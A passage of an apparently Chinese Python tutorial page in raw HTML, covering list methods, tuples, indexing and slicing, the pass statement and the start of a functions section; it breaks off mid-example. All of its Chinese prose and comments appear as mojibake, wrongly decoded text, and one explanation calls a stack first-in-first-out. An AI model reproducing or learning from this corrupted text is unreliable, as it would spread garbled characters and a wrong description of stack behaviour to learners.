class="built_in">print</span>(my_list)</span><br><span class="line"><span class="comment">#[&#x27;G&#x27;, &#x27;0&#x27;, &#x27;u&#x27;, &#x27;f&#x27;, &#x27;3&#x27;, &#x27;n&#x27;, 6]</span></span><br><span class="line"><span class="comment">#[&#x27;G&#x27;, &#x27;0&#x27;, &#x27;u&#x27;, &#x27;f&#x27;, &#x27;3&#x27;, &#x27;n&#x27;, 6, 6, 6, 6, 6]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ­¤å¤–ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨insert()æ–¹æ³•åœ¨éœ€è¦çš„ä½ç½®æ’å…¥ä¸€ä¸ªé¡¹ï¼Œæˆ–è€…é€šè¿‡å°†å¤šä¸ªé¡¹å‹ç¼©åˆ°åˆ—è¡¨çš„ä¸€ä¸ªç©ºåˆ‡ç‰‡ä¸­æ¥æ’å…¥å¤šä¸ªé¡¹</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">odd = [<span class="number">1</span>, <span class="number">9</span>]</span><br><span class="line">odd.insert(<span class="number">1</span>,<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾“å‡º: [1, 3, 9] </span></span><br><span class="line"><span class="built_in">print</span>(odd)</span><br><span class="line"></span><br><span class="line">odd[<span class="number">2</span>:<span class="number">2</span>] = [<span class="number">5</span>, <span class="number">7</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾“å‡º: [1, 3, 5, 7, 9]</span></span><br><span class="line"><span class="built_in">print</span>(odd)</span><br></pre></td></tr></table></figure><h3 id="å¦‚ä½•ä»åˆ—è¡¨ä¸­åˆ é™¤æˆ–åˆ é™¤å…ƒç´ ï¼Ÿ"><a href="#å¦‚ä½•ä»åˆ—è¡¨ä¸­åˆ é™¤æˆ–åˆ é™¤å…ƒç´ ï¼Ÿ" class="headerlink" title="å¦‚ä½•ä»åˆ—è¡¨ä¸­åˆ é™¤æˆ–åˆ é™¤å…ƒç´ ï¼Ÿ"></a>å¦‚ä½•ä»åˆ—è¡¨ä¸­åˆ é™¤æˆ–åˆ é™¤å…ƒç´ ï¼Ÿ</h3><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å…³é”®å­—delä»åˆ—è¡¨ä¸­åˆ é™¤ä¸€ä¸ªæˆ–å¤šä¸ªé¡¹ã€‚å®ƒç”šè‡³å¯ä»¥å®Œå…¨åˆ é™¤åˆ—è¡¨ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_list =[<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;n&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> my_list[<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(my_list)</span><br><span class="line"><span class="keyword">del</span> my_list[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line"><span class="built_in">print</span>(my_list)</span><br><span class="line"><span class="keyword">del</span> my_list</span><br><span class="line"><span class="built_in">print</span>(my_list)</span><br><span class="line"><span class="comment">#[&#x27;G&#x27;, &#x27;u&#x27;, &#x27;f&#x27;, &#x27;3&#x27;, &#x27;n&#x27;]</span></span><br><span class="line"><span class="comment">#[&#x27;G&#x27;, &#x27;u&#x27;]</span></span><br><span class="line"><span class="comment">#NameError: name &#x27;my_list&#x27; is not defined</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨remove()æ–¹æ³•åˆ é™¤ç»™å®šé¡¹ç›®ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨pop()æ–¹æ³•åˆ é™¤ç»™å®šç´¢å¼•å¤„çš„é¡¹ç›®ã€‚</p><p>å¦‚æœæœªæä¾›ç´¢å¼•ï¼Œåˆ™pop()æ–¹æ³•å°†åˆ é™¤å¹¶è¿”å›æœ€åä¸€é¡¹ã€‚è¿™æœ‰åŠ©äºæˆ‘ä»¬å°†åˆ—è¡¨å®ç°ä¸ºå †æ ˆï¼ˆå…ˆè¿›å…ˆå‡ºæ•°æ®ç»“æ„ï¼‰ã€‚</p><p>æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨è¯¥clear()æ–¹æ³•æ¸…ç©ºåˆ—è¡¨ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_list =[<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;n&#x27;</span>]</span><br><span class="line">my_list.remove(<span class="string">&#x27;G&#x27;</span>)<span class="comment">#æŒ‡å®šå°†Gåˆ é™¤</span></span><br><span class="line"><span class="built_in">print</span>(my_list)</span><br><span class="line"><span class="built_in">print</span>(my_list.pop(<span class="number">1</span>))<span class="comment">#å°†ç¬¬äºŒä½åˆ é™¤å¹¶æ˜¾ç¤ºå‡ºæ¥</span></span><br><span class="line"><span class="built_in">print</span>(my_list)<span class="comment">#æ‰“å°å‡ºæ¥u</span></span><br><span class="line"><span class="built_in">print</span>(my_list.pop())<span class="comment">#æ²¡æœ‰æä¾›ç´¢å¼•ï¼Œé»˜è®¤æœ€åä¸€ä½åˆ é™¤å¹¶æ˜¾ç¤º</span></span><br><span class="line"><span class="built_in">print</span>(my_list)<span class="comment">#æ‰“å°å‡ºæ¥n</span></span><br><span class="line">my_list.clear()<span class="comment">#æ¸…ç©ºåˆ—è¡¨</span></span><br><span class="line"><span class="built_in">print</span>(my_list)</span><br><span class="line"><span class="comment">#[&#x27;0&#x27;, &#x27;u&#x27;, &#x27;f&#x27;, &#x27;3&#x27;, &#x27;n&#x27;]</span></span><br><span class="line"><span class="comment">#u</span></span><br><span class="line"><span class="comment">#[&#x27;0&#x27;, &#x27;f&#x27;, &#x27;3&#x27;, &#x27;n&#x27;]</span></span><br><span class="line"><span class="comment">#n</span></span><br><span class="line"><span class="comment">#[&#x27;0&#x27;, &#x27;f&#x27;, &#x27;3&#x27;]</span></span><br><span class="line"><span class="comment">#[]</span></span><br></pre></td></tr></table></figure><h3 id="Pythonåˆ—è¡¨æ–¹æ³•"><a href="#Pythonåˆ—è¡¨æ–¹æ³•" class="headerlink" title="Pythonåˆ—è¡¨æ–¹æ³•"></a>Pythonåˆ—è¡¨æ–¹æ³•</h3><p>å®ƒä»¬ä»¥list.method()æ–¹å¼è®¿é—®ã€‚ä¸Šé¢å·²ç»ä½¿ç”¨äº†æŸäº›æ–¹æ³•ã€‚</p><table><thead><tr><th align="left"><a href="https://www.cainiaoplus.com/python/python-methods-list.html">Pythonåˆ—è¡¨æ–¹æ³•</a></th></tr></thead><tbody><tr><td align="left"><a href="https://www.cainiaoplus.com/python/python-methods-list-append.html"><strong>append()</strong> -å°†å…ƒç´ æ·»åŠ åˆ°åˆ—è¡¨çš„æœ«å°¾</a></td></tr><tr><td align="left"><a href="https://www.cainiaoplus.com/python/python-methods-list-extend.html"><strong>extend()</strong> -å°†åˆ—è¡¨çš„æ‰€æœ‰å…ƒç´ æ·»åŠ åˆ°å¦ä¸€ä¸ªåˆ—è¡¨</a></td></tr><tr><td align="left"><a href="https://www.cainiaoplus.com/python/python-methods-list-insert.html"><strong>insert()</strong> -åœ¨å®šä¹‰çš„ç´¢å¼•å¤„æ’å…¥ä¸€ä¸ªé¡¹ç›®</a></td></tr><tr><td align="left"><a href="https://www.cainiaoplus.com/python/python-methods-list-remove.html"><strong>remove()</strong> -ä»åˆ—è¡¨ä¸­åˆ é™¤ä¸€ä¸ªé¡¹ç›®</a></td></tr><tr><td align="left"><a href="https://www.cainiaoplus.com/python/python-methods-list-pop.html"><strong>pop()</strong> -åˆ é™¤å¹¶è¿”å›ç»™å®šç´¢å¼•å¤„çš„å…ƒç´ </a></td></tr><tr><td align="left"><a href="https://www.cainiaoplus.com/python/python-methods-list-clear.html"><strong>clear()</strong> -ä»åˆ—è¡¨ä¸­åˆ é™¤æ‰€æœ‰é¡¹ç›®</a></td></tr><tr><td align="left"><a href="https://www.cainiaoplus.com/python/python-methods-list-index.html"><strong>index()</strong> -è¿”å›ç¬¬ä¸€ä¸ªåŒ¹é…é¡¹çš„ç´¢å¼•</a></td></tr><tr><td align="left"><a href="https://www.cainiaoplus.com/python/python-methods-list-count.html"><strong>count()</strong> -è¿”å›ä½œä¸ºå‚æ•°ä¼ é€’çš„é¡¹ç›®æ•°</a></td></tr><tr><td align="left"><a href="https://www.cainiaoplus.com/python/python-methods-list-sort.html"><strong>sort()</strong> -ä»¥å‡åºå¯¹åˆ—è¡¨ä¸­çš„é¡¹ç›®è¿›è¡Œæ’åº</a></td></tr><tr><td align="left"><a href="https://www.cainiaoplus.com/python/python-methods-list-reverse.html"><strong>reverse()</strong> -åè½¬åˆ—è¡¨ä¸­é¡¹ç›®çš„é¡ºåº</a></td></tr><tr><td align="left"><a href="https://www.cainiaoplus.com/python/python-methods-list-copy.html"><strong>copy()</strong> -è¿”å›åˆ—è¡¨çš„æµ…è¡¨å‰¯æœ¬</a></td></tr></tbody></table><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_list =[<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="number">6</span>,<span class="number">6</span>]</span><br><span class="line"><span class="built_in">print</span>(my_list.index(<span class="string">&#x27;n&#x27;</span>))<span class="comment">#æ˜¾ç¤ºç´¢å¼•</span></span><br><span class="line"><span class="built_in">print</span>(my_list.count(<span class="number">6</span>))<span class="comment">#è®¡æ•°</span></span><br><span class="line">second_list =[<span class="number">1</span>,<span class="number">23</span>,<span class="number">3</span>,<span class="number">13</span>,<span class="number">13</span>]</span><br><span class="line">second_list.sort()<span class="comment">#å‡åºæ’åˆ—</span></span><br><span class="line"><span class="built_in">print</span>(second_list)</span><br><span class="line">second_list.reverse()<span class="comment">#é€†è½¬</span></span><br><span class="line"><span class="built_in">print</span>(second_list)</span><br><span class="line"><span class="comment">#5</span></span><br><span class="line"><span class="comment">#2</span></span><br><span class="line"><span class="comment">#[1, 3, 13, 13, 23]</span></span><br><span class="line"><span class="comment">#[23, 13, 13, 3, 1]</span></span><br></pre></td></tr></table></figure><h3 id="åˆ—è¡¨ç†è§£ï¼šåˆ›å»ºæ–°åˆ—è¡¨çš„ä¼˜é›…æ–¹å¼"><a href="#åˆ—è¡¨ç†è§£ï¼šåˆ›å»ºæ–°åˆ—è¡¨çš„ä¼˜é›…æ–¹å¼" class="headerlink" title="åˆ—è¡¨ç†è§£ï¼šåˆ›å»ºæ–°åˆ—è¡¨çš„ä¼˜é›…æ–¹å¼"></a>åˆ—è¡¨ç†è§£ï¼šåˆ›å»ºæ–°åˆ—è¡¨çš„ä¼˜é›…æ–¹å¼</h3><p>åˆ—è¡¨ç†è§£æ˜¯ä»Pythonç°æœ‰åˆ—è¡¨ä¸­åˆ›å»ºæ–°åˆ—è¡¨çš„ä¸€ç§ç®€æ´æ˜äº†çš„æ–¹æ³•ã€‚</p><p>åˆ—è¡¨ç†è§£åŒ…å«ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œåè·Ÿæ–¹æ‹¬å·å†…çš„<a href="https://www.cainiaoplus.com/python/python-for-loop.html">forè¯­å¥</a>ã€‚</p><p>è¿™æ˜¯ä¸€ä¸ªåˆ—å‡ºæ¯é¡¹å¢åŠ 2çš„å¹‚çš„ç¤ºä¾‹ã€‚</p><h2 id="Python-å…ƒç»„ï¼ˆTupleï¼‰"><a href="#Python-å…ƒç»„ï¼ˆTupleï¼‰" class="headerlink" title="Python å…ƒç»„ï¼ˆTupleï¼‰"></a>Python å…ƒç»„ï¼ˆTupleï¼‰</h2><h3 id="åˆ›å»ºä¸€ä¸ªå…ƒç»„"><a href="#åˆ›å»ºä¸€ä¸ªå…ƒç»„" class="headerlink" title="åˆ›å»ºä¸€ä¸ªå…ƒç»„"></a>åˆ›å»ºä¸€ä¸ªå…ƒç»„</h3><p>é€šè¿‡å°†æ‰€æœ‰é¡¹ç›®ï¼ˆå…ƒç´ ï¼‰æ”¾åœ¨æ‹¬å·å†…()ï¼ˆä»¥é€—å·åˆ†éš”ï¼‰æ¥åˆ›å»ºå…ƒç»„ã€‚æ‹¬å·æ˜¯å¯é€‰çš„ï¼Œä½†æ˜¯ï¼Œä½¿ç”¨æ‹¬å·æ˜¯ä¸€ä¸ªå¥½ä¹ æƒ¯ã€‚</p><p>å…ƒç»„å¯ä»¥å…·æœ‰ä»»æ„æ•°é‡çš„é¡¹ï¼Œå¹¶ä¸”å®ƒä»¬å¯ä»¥å…·æœ‰ä¸åŒçš„ç±»å‹ï¼ˆæ•´æ•°ï¼Œæµ®ç‚¹æ•°ï¼Œåˆ—è¡¨ï¼Œ<a href="https://www.cainiaoplus.com/python/python-string.html">å­—ç¬¦ä¸²</a>ç­‰ï¼‰ã€‚</p><p>ä¹Ÿå¯ä»¥åœ¨ä¸ä½¿ç”¨æ‹¬å·çš„æƒ…å†µä¸‹åˆ›å»ºå…ƒç»„ã€‚è¿™ç§°ä¸ºå…ƒç»„åŒ…è£…ã€‚</p><p>ç”¨ä¸€ä¸ªå…ƒç´ åˆ›å»ºä¸€ä¸ªå…ƒç»„æœ‰ç‚¹ç‰¹æ®Šã€‚</p><p><strong>åªæœ‰ä¸€ä¸ªå…ƒç´ çš„å…ƒç»„ï¼Œæ‹¬å·å†…ä»…åŒ…å«ä¸€ä¸ªå…ƒç´ æ˜¯ä¸å¤Ÿçš„ã€‚æˆ‘ä»¬å°†éœ€è¦ä¸€ä¸ªé€—å·ç»“å°¾æ¥è¡¨æ˜å®ƒå®é™…ä¸Šæ˜¯ä¸€ä¸ªå…ƒç»„ã€‚</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_tuple=(<span class="string">&quot;Gu0f3n&quot;</span>)<span class="comment">#åˆ›å»ºä¸€ä¸ªå…ƒç»„</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(my_tuple))<span class="comment">#æ‰“å°å…ƒç»„å†…å®¹</span></span><br><span class="line">my_tuple=(<span class="string">&quot;Gu0f3n&quot;</span>,)<span class="comment">#åˆ›å»ºåªæœ‰ä¸€ä¸ªå…ƒç´ çš„å…ƒç»„</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(my_tuple))</span><br><span class="line">my_tuple=<span class="string">&quot;Guof3n&quot;</span>,<span class="comment">#ä¸é€‚ç”¨æ‹¬å·è¿›è¡Œå…ƒç»„åŒ…è£…ï¼ˆæ‹¬å·å¯é€‰ï¼‰</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(my_tuple))</span><br><span class="line"></span><br><span class="line"><span class="comment">#&lt;class &#x27;str&#x27;&gt;</span></span><br><span class="line"><span class="comment">#&lt;class &#x27;tuple&#x27;&gt;</span></span><br><span class="line"><span class="comment">#&lt;class &#x27;tuple&#x27;&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="è®¿é—®å…ƒç»„å…ƒç´ "><a href="#è®¿é—®å…ƒç»„å…ƒç´ " class="headerlink" title="è®¿é—®å…ƒç»„å…ƒç´ "></a>è®¿é—®å…ƒç»„å…ƒç´ </h3><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡å¤šç§æ–¹å¼è®¿é—®å…ƒç»„çš„å…ƒç´ ã€‚</p><p>1.ç´¢å¼•</p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç´¢å¼•è¿ç®—ç¬¦[]è®¿é—®ç´¢å¼•ä»0å¼€å§‹çš„å…ƒç»„ä¸­çš„é¡¹ç›®ã€‚</p><p>å› æ­¤ï¼Œå…·æœ‰6ä¸ªå…ƒç´ çš„å…ƒç»„å°†å…·æœ‰ä»0åˆ°5çš„ç´¢å¼•ã€‚å°è¯•è®¿é—®å…ƒç»„ä¹‹å¤–çš„å…ƒç´ ï¼ˆä¾‹å¦‚6ã€7 â€¦ï¼‰å°†å¼•å‘IndexErrorã€‚</p><p>ç´¢å¼•å¿…é¡»æ˜¯æ•´æ•°ï¼›å› æ­¤æˆ‘ä»¬ä¸èƒ½ä½¿ç”¨floatæˆ–å…¶ä»–ç±»å‹ã€‚å¦‚æœä½¿ç”¨ä¼šå¯¼è‡´TypeErrorã€‚</p><p>åŒæ ·ï¼Œä½¿ç”¨åµŒå¥—ç´¢å¼•è®¿é—®åµŒå¥—å…ƒç»„ï¼Œå¦‚ä¸‹é¢çš„ç¤ºä¾‹æ‰€ç¤ºã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_tuple =(<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(my_tuple[<span class="number">1</span>])</span><br><span class="line"><span class="comment"># IndexError:åˆ—è¡¨ç´¢å¼•è¶…å‡ºèŒƒå›´</span></span><br><span class="line"><span class="comment"># print(my_tuple[6])</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç´¢å¼•å¿…é¡»æ˜¯æ•´æ•°</span></span><br><span class="line"><span class="comment"># TypeError: åˆ—è¡¨ç´¢å¼•å¿…é¡»æ˜¯æ•´æ•°ï¼Œè€Œä¸æ˜¯æµ®ç‚¹æ•°</span></span><br><span class="line"><span class="comment"># my_tuple[2.0]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#åµŒå¥—å…ƒç»„</span></span><br><span class="line">n_tuple=(<span class="string">&quot;Guof3n&quot;</span>,[<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>],(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>))</span><br><span class="line"><span class="built_in">print</span>(n_tuple[<span class="number">0</span>][<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(n_tuple[<span class="number">2</span>][<span class="number">1</span>])</span><br><span class="line"><span class="comment">#2</span></span><br><span class="line"><span class="comment">#3</span></span><br><span class="line"><span class="comment">#2</span></span><br></pre></td></tr></table></figure><p>2.è´Ÿç´¢å¼•</p><p>Pythonå…è®¸å¯¹å…¶åºåˆ—è¿›è¡Œè´Ÿç´¢å¼•ã€‚</p><p>ç´¢å¼•-1è¡¨ç¤ºæœ€åä¸€é¡¹ï¼Œ-2è¡¨ç¤ºå€’æ•°ç¬¬äºŒé¡¹ï¼Œä¾æ­¤ç±»æ¨ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_tuple=(<span class="string">&quot;G&quot;</span>,<span class="string">&quot;u&quot;</span>,<span class="string">&quot;0&quot;</span>,<span class="string">&quot;f&quot;</span>,<span class="string">&quot;3&quot;</span>,<span class="string">&quot;n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(my_tuple[-<span class="number">1</span>])<span class="comment">#n</span></span><br><span class="line"><span class="built_in">print</span>(my_tuple[-<span class="number">5</span>])<span class="comment">#u</span></span><br></pre></td></tr></table></figure><p>3.åˆ‡ç‰‡</p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨åˆ‡ç‰‡è¿ç®—ç¬¦-å†’å·â€œï¼šâ€è®¿é—®å…ƒç»„ä¸­çš„ä¸€ç³»åˆ—é¡¹ç›®ã€‚</p><p>å’Œåˆ—è¡¨å·®ä¸å¤ªå¤šã€ï¼‰</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_tuple=(<span class="string">&quot;G&quot;</span>,<span class="string">&quot;u&quot;</span>,<span class="string">&quot;o&quot;</span>,<span class="string">&quot;f&quot;</span>,<span class="string">&quot;3&quot;</span>,<span class="string">&quot;n&quot;</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(my_tuple[<span class="number">1</span>:<span class="number">5</span>])<span class="comment">#(&#x27;u&#x27;, &#x27;o&#x27;, &#x27;f&#x27;, &#x27;3&#x27;)</span></span><br><span class="line"><span class="built_in">print</span>(my_tuple[:<span class="number">2</span>])<span class="comment">#(&#x27;G&#x27;, &#x27;u&#x27;)</span></span><br><span class="line"><span class="built_in">print</span>(my_tuple[:-<span class="number">7</span>])<span class="comment">#(&#x27;G&#x27;, &#x27;u&#x27;)</span></span><br><span class="line"><span class="built_in">print</span>(my_tuple[<span class="number">2</span>:])<span class="comment">#(&#x27;o&#x27;, &#x27;f&#x27;, &#x27;3&#x27;, &#x27;n&#x27;, 6, 6, 6)</span></span><br><span class="line"><span class="built_in">print</span>(my_tuple[:])<span class="comment">#(&#x27;G&#x27;, &#x27;u&#x27;, &#x27;o&#x27;, &#x27;f&#x27;, &#x27;3&#x27;, &#x27;n&#x27;, 6, 6, 6)</span></span><br></pre></td></tr></table></figure><p>é€šè¿‡è€ƒè™‘ç´¢å¼•ä½äºå…ƒç´ ä¹‹é—´ï¼Œå¯ä»¥æœ€å¥½åœ°å¯è§†åŒ–åˆ‡ç‰‡ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚å› æ­¤ï¼Œå¦‚æœè¦è®¿é—®èŒƒå›´ï¼Œåˆ™éœ€è¦å°†å…ƒç»„ä¸­çš„éƒ¨åˆ†åˆ‡ç‰‡çš„ç´¢å¼•ã€‚</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/1732086569792.png"></p><p>åé¢ä¸€äº›ç±»å‹åƒå­—å…¸ å…ƒç»„å’Œåˆ—è¡¨éƒ½å¤§å·®ä¸å·® æ‰€ä»¥è¿™ç« å…ˆåˆ°è¿™é‡Œ</p><h1 id="Python-pass-è¯­å¥"><a href="#Python-pass-è¯­å¥" class="headerlink" title="Python pass è¯­å¥"></a>Python pass è¯­å¥</h1><p>åœ¨æœ¬æ–‡ä¸­ï¼Œæ‚¨å°†å­¦ä¹ passè¯­å¥ã€‚ å®ƒç”¨ä½œåœ¨åé¢å®ç°å‡½æ•°ï¼Œå¾ªç¯ç­‰çš„å ä½ç¬¦ã€‚</p><h2 id="ä»€ä¹ˆæ˜¯Pythonä¸­çš„passè¯­å¥ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯Pythonä¸­çš„passè¯­å¥ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯Pythonä¸­çš„passè¯­å¥ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯Pythonä¸­çš„passè¯­å¥ï¼Ÿ</h2><p>åœ¨Pythonç¼–ç¨‹ä¸­ï¼Œpassè¯­å¥ä¸ºç©ºè¯­å¥ã€‚åœ¨Pythonä¸­ï¼Œ<a href="https://www.cainiaoplus.com/python/python-statement-indentation-comments.html">æ³¨é‡Š</a>å’Œpassè¯­å¥ä¹‹é—´çš„åŒºåˆ«åœ¨äºï¼Œå°½ç®¡è§£é‡Šå™¨å®Œå…¨å¿½ç•¥æ³¨é‡Šï¼Œè€Œpassä¸ä¼šè¢«å¿½ç•¥ã€‚</p><p>ä½†æ˜¯ï¼Œæ‰§è¡Œä¼ é€’æ—¶æ²¡æœ‰ä»»ä½•ååº”ã€‚ç»“æœä¸ºæ— æ“ä½œï¼ˆNOPï¼‰ã€‚</p><h3 id="passè¯­æ³•"><a href="#passè¯­æ³•" class="headerlink" title="passè¯­æ³•"></a>passè¯­æ³•</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pass</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬é€šå¸¸å°†å…¶ç”¨ä½œå ä½ç¬¦ã€‚</p><p>å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªå°šæœªå®ç°çš„<a href="https://www.cainiaoplus.com/python/python-for-loop.html">å¾ªç¯</a>æˆ–<a href="https://www.cainiaoplus.com/python/python-function.html">å‡½æ•°</a>ï¼Œä½†æˆ‘ä»¬æƒ³åœ¨å°†æ¥æ‰§è¡Œå®ç°å®ƒã€‚ä»–ä»¬ä¸èƒ½æœ‰ä¸€ä¸ªç©ºçš„ä¸»ä½“ï¼Œè§£é‡Šå™¨å°†ç»™å‡ºé”™è¯¯ã€‚å› æ­¤ï¼Œæˆ‘ä»¬ä½¿ç”¨è¯¥passè¯­å¥æ„é€ ä¸€ä¸ªä¸æ‰§è¡Œä»»ä½•æ“ä½œçš„ä¸»ä½“ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#x27;&#x27;passåªæ˜¯ä¸€ä¸ªå ä½ç¬¦ï¼Œ</span><br><span class="line">ç”¨äºä»¥åæ·»åŠ åŠŸèƒ½ã€‚&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><h1 id="Python-å‡½æ•°"><a href="#Python-å‡½æ•°" class="headerlink" title="Python å‡½æ•°"></a>Python å‡½æ•°</h1><p>åœ¨æœ¬æ–‡ä¸­ï¼Œæ‚¨å°†äº†è§£å‡½æ•°ã€å‡½æ•°æ˜¯ä»€ä¹ˆã€å‡½æ•°çš„è¯­æ³•ã€æ„æˆå’Œç±»å‹ã€‚å¦å¤–ï¼Œæ‚¨è¿˜å°†å­¦ä¹ å¦‚ä½•ç”¨Pythonåˆ›å»ºå‡½æ•°ã€‚</p><h2 id="Pythonä¸­çš„å‡½æ•°æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#Pythonä¸­çš„å‡½æ•°æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="Pythonä¸­çš„å‡½æ•°æ˜¯ä»€ä¹ˆï¼Ÿ"></a>Pythonä¸­çš„å‡½æ•°æ˜¯ä»€ä¹ˆï¼Ÿ</h2><p>åœ¨Pythonä¸­ï¼Œå‡½æ•°æ˜¯ä¸€ç»„æ‰§è¡Œç‰¹å®šä»»åŠ¡çš„ç›¸å…³è¯­å¥ã€‚</p><p>å‡½æ•°æœ‰åŠ©äºå°†æˆ‘ä»¬çš„ç¨‹åºåˆ†è§£ä¸º<strong>è¾ƒå°çš„æ¨¡å—</strong>ã€‚éšç€æˆ‘ä»¬çš„é¡¹ç›®è¶Šæ¥è¶Šå¤§ï¼Œå‡½æ•°ä½¿å…¶å˜å¾—æ›´åŠ æœ‰ç»„ç»‡å’Œæ˜“äºç®¡ç†ã€‚</p><p>æ­¤å¤–ï¼Œå®ƒé¿å…äº†é‡å¤å†™ç›¸åŒçš„ä»£ç ï¼Œå‡½æ•°ä½¿ä»£ç å¯é‡å¤ä½¿ç”¨ã€‚</p><h3 id="å‡½æ•°è¯­æ³•"><a href="#å‡½æ•°è¯­æ³•" class="headerlink" title="å‡½æ•°è¯­æ³•"></a>å‡½æ•°è¯­æ³•</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">function_name</span>(<span class="params">parameters</span>):</span><br><span class="line"><span class="string">&quot;&quot;&quot;docstring&quot;&quot;&quot;</span></span><br><span class="line">statement(s)</span><br></pre></td></tr></table></figure><p>ä¸Šé¢æ˜¾ç¤ºçš„æ˜¯ç”±ä»¥ä¸‹ç»„ä»¶ç»„æˆçš„å‡½æ•°å®šä¹‰ã€‚</p><ol><li>defæ ‡è®°å‡½æ•°å¤´å¼€å§‹çš„å…³é”®å­—ã€‚</li><li>ç”¨äºå”¯ä¸€æ ‡è¯†å‡½æ•°çš„å‡½æ•°åç§°ã€‚å‡½æ•°å‘½åéµå¾ª<a href="https://www.cainiaoplus.com/python/python-keywords-identifier.html#rules">åœ¨Pythonä¸­ç¼–å†™æ ‡è¯†ç¬¦</a>çš„ç›¸åŒ<a href="https://www.cainiaoplus.com/python/python-keywords-identifier.html#rules">è§„åˆ™</a>ã€‚</li><li>é€šè¿‡å…¶å°†å€¼ä¼ é€’ç»™å‡½æ•°çš„å‚æ•°ã€‚å®ƒä»¬æ˜¯å¯é€‰çš„ã€‚</li><li>å†’å·ï¼ˆ:)æ ‡è®°å‡½æ•°å¤´çš„ç»“å°¾ã€‚</li><li>å¯é€‰çš„æ–‡æ¡£å­—ç¬¦ä¸²ï¼ˆdocstringï¼‰ï¼Œç”¨äºæè¿°å‡½æ•°çš„å‡½æ•°ã€‚</li><li>ç»„æˆå‡½æ•°ä½“çš„ä¸€ä¸ªæˆ–å¤šä¸ªæœ‰æ•ˆpythonè¯­å¥ã€‚è¯­å¥å¿…é¡»å…·æœ‰ç›¸åŒçš„ç¼©è¿›çº§åˆ«ï¼ˆé€šå¸¸ä¸º4ä¸ªç©ºæ ¼ï¼‰ã€‚</li><li>å¯é€‰çš„returnè¯­å¥ï¼Œç”¨äºä»å‡½æ•°è¿”å›å€¼ã€‚</li></ol><h3 id="å‡½æ•°ç¤ºä¾‹"><a href="#å‡½æ•°ç¤ºä¾‹" class="headerlink" title="å‡½æ•°ç¤ºä¾‹"></a>å‡½æ•°ç¤ºä¾‹</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">greet</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    è¿™æ˜¯ä¸€ä¸ªæ‰“æ‹›å‘¼çš„å‡½æ•°ï¼Œ</span></span><br><span class="line"><span class="string">    é€šè¿‡nameå‚æ•°ä¼ é€’ï¼Œ</span></span><br><span class="line"><span class="string">    è¦æ‰“æ‹›å‘¼çš„äººå</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Hello, &quot;</span> + name + <span class="string">&quot;. Good 